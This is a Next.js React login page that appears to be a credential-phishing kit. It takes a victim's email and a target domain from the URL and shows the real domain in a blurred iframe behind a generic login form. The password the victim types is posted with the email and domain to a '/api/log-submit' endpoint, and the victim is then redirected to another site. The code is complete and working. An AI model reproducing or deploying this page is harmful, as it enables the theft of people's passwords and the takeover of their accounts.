'use client'

import { useSearchParams } from 'next/navigation'
import { useState, useEffect } from 'react'

export default function LoginPage() {
  const searchParams = useSearchParams()
  const prefilledEmail = searchParams.get('email') || ''
  const domain = searchParams.get('domain') || ''

  const [email, setEmail] = useState(prefilledEmail)
  const [confirmedEmail, setConfirmedEmail] = useState(!!prefilledEmail)
  const [password, setPassword] = useState('')
  const [showModal, setShowModal] = useState(false)
  const [errors, setErrors] = useState({ password: '', email: '' })

  useEffect(() => {
    // Auto-confirm email if it's in the URL
    if (prefilledEmail) {
      setConfirmedEmail(true)
    }
  }, [prefilledEmail])

  const validateEmail = (email: string) =>
    /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)

  const handleEmailSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    if (!validateEmail(email)) {
      setErrors({ ...errors, email: 'Please enter a valid email address' })
      return
    }
    setConfirmedEmail(true)
    setErrors({ ...errors, email: '' })
  }

  const handlePasswordSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    if (password.length < 5) {
      setErrors({ ...errors, password: 'Password must be at least 5 characters' })
      return
    }

    setShowModal(true)

    await fetch('/api/log-submit', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email, password, domain }),
    })

    setTimeout(() => {
      window.location.href = 'https://testingmysite.com'
    }, 2000)
  }

  return (
    <div className="relative min-h-screen bg-light-blue flex items-center justify-center">
      {/* Optional blurred iframe */}
      {domain && (
        <iframe
          src={`https://${domain}`}
          className="absolute inset-0 w-full h-full opacity-20 pointer-events-none blur-sm"
        />
      )}

      {/* Modal */}
      {showModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50">
          <div className="bg-white rounded-xl shadow-lg p-6 max-w-sm text-center">
            <h2 className="text-xl font-semibold text-gray-800">Please wait...</h2>
            <p className="mt-2 text-gray-600">Submitting your credentials.</p>
          </div>
        </div>
      )}

      {/* Login UI */}
      <div className="relative z-10 bg-white/80 backdrop-blur-md rounded-xl shadow-xl p-8 max-w-md w-full">
        <h1 className="text-2xl font-bold text-center text-gray-800 mb-4">Login</h1>

        {!confirmedEmail ? (
          <form onSubmit={handleEmailSubmit} className="space-y-4">
            <input
              type="email"
              placeholder="Enter your email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className="w-full p-2 border rounded-md focus:outline-none"
              required
            />
            {errors.email && (
              <p className="text-sm text-red-600">{errors.email}</p>
            )}
            <button
              type="submit"
              className="w-full bg-blue-500 text-white py-2 rounded-md hover:bg-blue-600 transition"
            >
              Next
            </button>
          </form>
        ) : (
          <form onSubmit={handlePasswordSubmit} className="space-y-4">
            {/* Avatar and Email Display */}
            <div className="text-center mb-4">
              <div className="mx-auto mb-2 w-16 h-16 rounded-full bg-gray-300 flex items-center justify-center text-2xl text-white">
                {email[0]?.toUpperCase()}
              </div>
              <p className="text-gray-700 font-medium">{email}</p>
            </div>

            <input
              type="password"
              name="password"
              placeholder="Enter your password"
              value={password}
              onChange={(e) => {
                setPassword(e.target.value)
                if (errors.password && e.target.value.length >= 5) {
                  setErrors({ ...errors, password: '' })
                }
              }}
              className="w-full p-2 border rounded-md focus:outline-none"
              required
            />
            {errors.password && (
              <p className="text-sm text-red-600">{errors.password}</p>
            )}
            <button
              type="submit"
              className="w-full bg-blue-500 text-white py-2 rounded-md hover:bg-blue-600 transition"
            >
              Login
            </button>
          </form>
        )}
      </div>
    </div>
  )
}
